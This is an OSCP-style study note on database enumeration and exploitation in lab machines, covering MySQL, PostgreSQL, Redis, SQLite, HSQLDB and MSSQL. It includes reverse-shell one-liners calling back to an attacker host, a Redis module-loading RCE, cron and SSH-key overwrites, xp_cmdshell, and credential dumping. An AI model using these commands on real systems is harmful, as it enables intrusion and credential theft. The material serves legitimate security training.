---
title: "Database Enumeration"
slug: database-enumeration
category: notes
handbook: oscp
tags: ["databases", "enumeration"]
draft: false
pubDatetime: 2026-07-21T21:42:14+03:00
modDatetime: 2026-09-09T21:52:45+03:00
description: "Credentials pulled from an app config (`db.php`, `wp-config.php`, `configuration.php`, `.env`) open the database behind the app."
---
Credentials pulled from an app config (`db.php`, `wp-config.php`, `configuration.php`, `.env`) open the database behind the app. The database is usually a credential store: its user table holds passwords that get reused for SSH or `su`, which is the common lateral move after a web foothold.

It is not always a credential store. An empty database still runs a versioned daemon with a privileged local account behind it, and reaching the OS from there is its own step: [MySQL Privilege Escalation](/collections/oscp/mysql-privilege-escalation) for MySQL, and the `COPY FROM PROGRAM` route below for PostgreSQL.

It does not always need a credential either. Redis authenticates nobody by default, so an exposed 6379 is worth trying before any config file has been read at all.

## MySQL / MariaDB

Connect with the client, either from the foothold shell or from Kali if the port is exposed:

```bash
mysql -h 127.0.0.1 -u root -p'password'
```

- `-p` takes the password with **no space** after it, and quote it so the shell does not eat special characters. Bare `-p` prompts interactively, which behaves badly in a semi-interactive reverse shell.
- `-h 127.0.0.1` forces a TCP connection. Without `-h`, or with `-h localhost`, the client uses the local Unix socket, which explains runs that only work over one of the two.
- The client binary exists on the target whenever `mysqld` is running, so no upload is needed.
- A modern client defaults to requiring TLS and fails with `ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it` against an older server that never offered it. Add `--ssl-mode=DISABLED` (`--skip-ssl` on older clients) to force plaintext (Apex).

Enumerate databases, then a table's columns and rows:

```sql
show databases;
use SimplePHPGal;
show tables;
describe users;
select * from users;
```

Dump MySQL's own accounts as well, for hashes to crack:

```sql
select host, user, authentication_string from mysql.user;
```

### Non-interactive

When the interactive client misbehaves in a dumb shell, run each query with `-e` and read the result inline:

```bash
mysql -u root -p'password' -e 'show databases;'
mysql -u root -p'password' -e 'use SimplePHPGal; select * from users;'
```

### XAMPP / empty root

XAMPP on Windows often ships MySQL with **root and no password**, reachable only from the host. From a foothold shell, try empty root before hunting configs:

```cmd
C:\xampp\mysql\bin\mysql.exe -u root -e "show databases;"
C:\xampp\mysql\bin\mysql.exe -u root -e "select user,host,authentication_string from mysql.user;"
```

If that fails, check `C:\xampp\phpMyAdmin\config.inc.php` and app configs under `C:\xampp\htdocs`. A database named something like `creds` is an obvious next target.

### Dump first (mysqldump)

Prefer a full dump over live `-e` queries. `--all-databases` pulls every schema and row in one shot, so nothing interesting is missed because the wrong DB name was guessed. Grep the file on Kali afterward.

```cmd
C:\xampp\mysql\bin\mysqldump.exe -u root --all-databases > C:\temp\db.sql
```

From evil-winrm, `>` is PowerShell redirection and breaks the dump. Wrap in `cmd /c` ([Windows Remote Access](/collections/oscp/windows-remote-access)):

```powershell
cmd /c "C:\xampp\mysql\bin\mysqldump.exe -u root --all-databases > C:\temp\db.sql"
```

If `cmd /c` still misbehaves, mysqldump's own **`-r`** (outfile) writes the file without shell redirection:

```cmd
C:\xampp\mysql\bin\mysqldump.exe -u root --all-databases -r C:\temp\db.sql
```

```bash
# Linux foothold or exposed MySQL
mysqldump -u root -p'password' --all-databases > db.sql
```

Confirm size and `INSERT` rows on the box before downloading:

```cmd
dir C:\temp\db.sql
findstr /i "INSERT" C:\temp\db.sql
```

Pull with evil-winrm `download` ([File Transfers](/collections/oscp/file-transfers) / [Windows Remote Access](/collections/oscp/windows-remote-access)).

### Live queries (when a dump is not needed)

Spot checks without writing a file. Put the DB name after the user so `-e` stays simple:

```cmd
C:\xampp\mysql\bin\mysql.exe -u root -e "show databases"
C:\xampp\mysql\bin\mysql.exe -u root creds -e "show tables"
C:\xampp\mysql\bin\mysql.exe -u root creds -e "select * from creds"
```

Evil-winrm is PowerShell: call `mysql.exe` directly if `cmd /c` breaks quoting. Table name can match the database name (`creds.creds`).

### Reading a .sql dump on Kali

If `grep INSERT` returns nothing, the dump failed, so re-run with `cmd /c` or `-r`. Do not import a broken file.

```bash
wc -c db.sql
grep -c INSERT db.sql
grep -iE 'INSERT INTO|password|admin' db.sql
```

`INSERT INTO` = data; `CREATE TABLE` = schema only. Plaintext and base64 sit in the value lists. Hashes (`$2y$`, `$6$`, 32-char MD5) go to [Password Cracking](/collections/oscp/password-cracking).

Import only when the dump has real `INSERT`s and local MySQL/MariaDB is **running**:

```bash
sudo systemctl start mysql    # or mariadb; ERROR 2002 = server not running
sudo mysql < db.sql
sudo mysql -e 'SHOW DATABASES;'
```

### What the rows are for

App user tables store passwords in whatever form the developer chose:

- **Plaintext or base64**: reuse or decode, then try `su <user>` and `ssh` (see [Base64 and Encodings](/collections/oscp/base64-and-encodings)). This was the path on Snookums, where michael's base64 password unlocked SSH.
- **A hash** (`$1$`, `$6$`, `$2y$`, bare MD5): crack it with John or hashcat, then reuse.

An app can split a user's credential across two tables, one deprecated and one live. OpenEMR's own `users` table stores a placeholder string, `NoLongerUsed`, in its password column; the real bcrypt hash sits in `users_secure` instead (Apex). Dumping only the obvious table returns something that looks like a hash-shaped miss rather than a dead field, worth checking the schema for a second credentials table before assuming a password is unrecoverable.

The MySQL `root` account here is the database admin, not OS root, and reaching the OS from it needs the `FILE` privilege routes in [MySQL Privilege Escalation](/collections/oscp/mysql-privilege-escalation) (Pebbles took that route from ZoneMinder's config creds).

## PostgreSQL

```bash
psql -h 127.0.0.1 -U postgres -d postgres            # prompts for password, or set PGPASSWORD
psql -h TARGET -U postgres -d postgres -p 5437       # -p when the port is not 5432
```

`postgres`/`postgres` is the default pair and it survives on lab boxes, so it is worth one attempt on any exposed PostgreSQL port before the port is written off. The port itself proves nothing: a database moved to 5437 answers exactly as it does on 5432, and the service scan is what identifies it.

Read the prompt psql prints after login. `postgres=#` is a superuser role, `postgres=>` is not, which is the difference between having the command execution below and not having it.

```sql
\l          -- list databases
\c dbname   -- connect to one
\dt         -- list tables
\du         -- list roles, and the attributes column says who is Superuser
select * from users;
```

### Command execution (CVE-2019-9193)

`COPY ... FROM PROGRAM` runs a shell command on the server and reads its stdout into a table. It is a documented feature rather than a bug, available to superusers and to members of `pg_execute_server_program`; PostgreSQL disputed the CVE on exactly that ground. The public exploits target 9.3 through 11.7, but a superuser on a newer release can do the same by hand. Nothing needs to be uploaded:

```sql
CREATE TABLE cmd_out(output text);
COPY cmd_out FROM PROGRAM 'id';
SELECT * FROM cmd_out;
DROP TABLE cmd_out;
```

EDB **50847** wraps the same statements with a version check and a randomised table name:

```bash
python 50847.py -i TARGET -p 5437 -d postgres -c whoami -U postgres -P postgres
```

`-p` is the port and `-P` is the password. Run a `whoami` first, then reuse the same call with a reverse shell. The command runs as the OS account the database runs under, usually `postgres`, so this is a foothold and not root. The string is handed to the server's shell, which is unknown from the outside, so prefer a payload that does not depend on which one it is ([Reverse Shells](/collections/oscp/reverse-shells)). Nibbles is the worked example: default credentials on 5437, empty tables, and the daemon's version was the entire path.

`COPY (SELECT '') TO PROGRAM 'cmd'` is the simpler form when the goal is a shell and not output: it feeds an empty row into the program's stdin and discards anything it writes back, so there is no scratch table to create or drop. Same privilege requirement, same CVE, and it runs straight from psql once logged in as a superuser:

```sql
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/KALI/4444 0>&1"';
```

Use `FROM PROGRAM` when a command's output has to come back through the query (`whoami`, `id`), and `TO PROGRAM` when the command is the payload and nothing needs reading back. Peppo is the worked example of the `TO PROGRAM` form, a plain reverse shell with no output needed.

The equivalent read primitive is `COPY t FROM '/etc/passwd';`, which needs the same privileges and reads any file the `postgres` user can.

## Redis

A key-value store with no authentication by default. `requirepass` is unset out of the box, and the only thing normally protecting it is `bind 127.0.0.1` plus protected mode, so a Redis reachable from the network is usually one somebody deliberately opened.

Check whether it answers before anything else:

```bash
redis-cli -h TARGET                      # -p when it is not on 6379, -a for a password
TARGET:6379> info server
TARGET:6379> config get dir              # the working directory, which the write primitives target
TARGET:6379> keys *
TARGET:6379> get somekey
```

`NOAUTH Authentication required.` means it has a password and the port is parked until one surfaces. Anything else means the instance takes commands from anyone who can reach it.

`nmap` settles this without a login: a populated `redis-info` block in the service scan is the instance having answered `INFO` unauthenticated, and it prints the version, the OS and kernel, and the bind addresses at the same time. That output is the finding, not the version string in it (Wombo).

Redis is rarely the objective. It is usually the session or cache store behind a web application, and the reason to attack it is that the process it runs in is often root.

### Replication plus modules: RCE on 4.x and 5.x

Three documented features, none of them a bug; that is why `searchsploit` lists them as "Unauthenticated Code Execution" with no CVE next to them:

- `SLAVEOF host port` points the instance at any master, and a full resync writes what that master sends to disk.
- `CONFIG SET dir` and `CONFIG SET dbfilename` choose the path it lands on.
- `MODULE LOAD /path/to.so`, added in 4.0, loads a shared object into the server process and registers the commands it exports.

So a rogue master serves a `.so` in place of an RDB dump, and `MODULE LOAD` executes it. Ridter/redis-rce automates all of it and ships the prebuilt module:

```bash
python redis-rce.py -r TARGET -p 6379 -L KALI -P 80 -f exp_lin.so
```

`-L`/`-P` is used twice, as the rogue master the target replicates from and as the reverse shell callback, so it has to be the tun0 address. `-a` for a password when there is one. Afterwards the instance is still a replica and the module is still on disk, so `info replication` should read `role:master` again and the `.so` in `config get dir` needs removing.

The shell arrives as whatever user the daemon runs as. Debian's packaged unit runs it as `redis`, and root means somebody changed that.

`n0b0dyCN/redis-rogue-server` is an alternative to `Ridter/redis-rce` that runs the same technique but doesn't ship a prebuilt module. It compiles `RedisModulesSDK/exp/exp.c` locally, which is old code and tends to fail on a modern GCC with `implicit declaration of function` errors for `strlen`/`strcat`/`inet_addr`, missing `#include <string.h>` and `#include <arpa/inet.h>` ([Fixing Public Exploits](/collections/oscp/fixing-public-exploits#missing-c-headers-on-modern-gcc)). That bundled source is a copy of n0b0dyCN/RedisModules-ExecuteCommand, a fork of RicterZ's original module. It exports `system.exec "cmd"` for one-shot commands and `system.rev KALI PORT` for a reverse shell once `MODULE LOAD`ed. If the copy bundled with redis-rogue-server won't build even after the header fixes, cloning that repo directly and running `make` in it produces the same `.so`, which `--exp` then points at instead of the default `exp.so`. Once it builds, redis-rogue-server prompts for interactive or reverse shell at runtime rather than taking every option as a flag (BlackGate).

If the replication handshake itself never completes (`SLAVEOF` sent, then nothing, no error, no matter how long it sits), check `config get dir` on the target first: `dir /` is often not writable by a non-root `redis` account even though `CONFIG SET dir /` succeeds (chdir only needs +x, not +w), so `config set dir /tmp` and confirming it stuck is worth ruling out before anything else. But a writable `dir` is not sufficient by itself, the callback connection back to the rogue master still has to complete, and that link is the part most likely to be fighting a lab network rather than the target.

The replication dance only exists to solve one problem: getting the `.so` bytes onto disk when Redis is the *only* write primitive on the box. `MODULE LOAD` takes any absolute path the process can read, not just whatever `dir` is configured to. If there is a second, unrelated write primitive anywhere else on the host, anonymous FTP, a writable NFS export, an SMB share, use it instead and skip replication entirely (Sybaris). Build the module on Kali first, same source as above:

```bash
git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand.git
cd RedisModules-ExecuteCommand
make
```

This drops `module.so` in the current directory (same GCC header errors as before are fixed the same way). Then push that file over whatever write primitive is available:

```
ftp TARGET
Name: anonymous
Password:
ftp> cd pub
ftp> put module.so
```

```
redis-cli -h TARGET
MODULE LOAD /var/ftp/pub/module.so
system.exec "id"
```

No `SLAVEOF`, no rogue master, no callback to babysit.

If `put` comes back `553 Could not create file` on a directory that is actually world-writable (`drwxrwxrwx`, confirmed with `ls -la`), don't burn time on permissions or SELinux theories, that dead end cost real time on Sybaris. PG machines carry state between sessions (the platform's own `revert`, separate from `start`, exists because of this) and a revert fixed it with no change on the attack side. Cause unconfirmed, could be leftover state from a prior allocation of the same box, or from an earlier failed attempt in the same session, don't assume which. If a write primitive that should work keeps 553ing for no permission-based reason, revert before digging further.

This technique has no CVE number and is easy to confuse with ones that do. CVE-2022-0543 is a separate, unrelated Redis RCE, a Lua sandbox escape specific to a Debian-packaged `liblua` build. A checker script written for that CVE tests one narrow condition and returning "no vulnerable hosts" from it says nothing about whether replication plus `MODULE LOAD` works (BlackGate).

### Write primitives when the module route is not available

Both need Redis running as root, and both work on any version, since they are just RDB saves aimed at a chosen path. Redis writes its own header bytes into the file, so the payload is padded with newlines: the surrounding junk becomes a comment or a syntax error the target parser skips.

```text
config set dir /root/.ssh
config set dbfilename authorized_keys
set pwn "\n\nssh-rsa AAAAB3Nza... kali@kali\n\n"
save
```

```text
config set dir /var/spool/cron/crontabs
config set dbfilename root
set pwn "\n\n* * * * * bash -i >& /dev/tcp/KALI/443 0>&1\n\n"
save
```

The SSH key is the cleaner of the two when 22 is open, since cron needs the file to pass `crontab`'s own validation and the path differs across distributions (`/var/spool/cron/root` on RHEL family).

## SQLite

No client to authenticate to, no port to find: a SQLite database is a single file, so anything that reads a file off the target (LFI, a download endpoint, a readable path from a foothold) hands over the whole thing. Pull it and browse it with `sqlite3` or DB Browser for SQLite rather than parsing it by hand. A file that should be binary SQLite but downloads as `text/html` did not come from the traversal at all, it is an error or login page saved under the requested name ([File Inclusion](/collections/oscp/file-inclusion#traversal-read-and-write-without-inclusion)).

Grafana keeps its own metadata, including data source configs, in an embedded SQLite file at `/var/lib/grafana/grafana.db`. The `data_source` table's `secure_json_data` column (a data source's stored password, API token, etc.) is AES-encrypted with a key derived from `secret_key` in `grafana.ini`, and the shipped default (`SW2YcwTIb9zpOOhoPsMm`) decrypts it whenever an admin never rotated the setting. On Fanatastic, a data source's decrypted `basicAuthPassword` turned out to be reused as a real system account's login password.

## HSQLDB

Another embedded engine, used by Java apps such as Openfire. Rather than one binary file, it keeps a `.script` file that is a plain-text SQL log HSQLDB replays on startup, readable directly with `cat`, no client and no port:

```bash
ls /var/lib/openfire/embedded-db
# openfire.script openfire.properties openfire.log ...
cat openfire.script
```

`CREATE TABLE`/`INSERT INTO` statements sit right there as text. Beyond the app's own user table, look at its settings/properties table too (Openfire's is `OFPROPERTY`): outbound mail, LDAP, and similar integration settings are stored the same way and often carry a cleartext service credential that gets reused for a system account (Fired).

## MSSQL

From Kali with impacket when 1433 is reachable:

```bash
impacket-mssqlclient user:'password'@TARGET
impacket-mssqlclient TARGET/user:'password'@TARGET -windows-auth
```

```sql
SELECT name FROM sys.databases;
-- OS command execution if the account is privileged enough:
EXEC xp_cmdshell 'whoami';
```

This route assumes credentials in hand and a reachable 1433. A SQL injection in a web app can drive the same `xp_cmdshell` with neither, through stacked queries; see [SQL Injection](/collections/oscp/sql-injection).

## Where This Sits

This is the step between [Credential Hunting](/collections/oscp/credential-hunting) (finding the config with the DB password) and either lateral movement by password reuse or OS access through [MySQL Privilege Escalation](/collections/oscp/mysql-privilege-escalation). Enumerate the app's own tables first, since a reused password is a cheaper win than a UDF.

Redis sits outside that order. It needs nothing found beforehand, so it belongs with the first pass over the port set rather than after a web foothold.
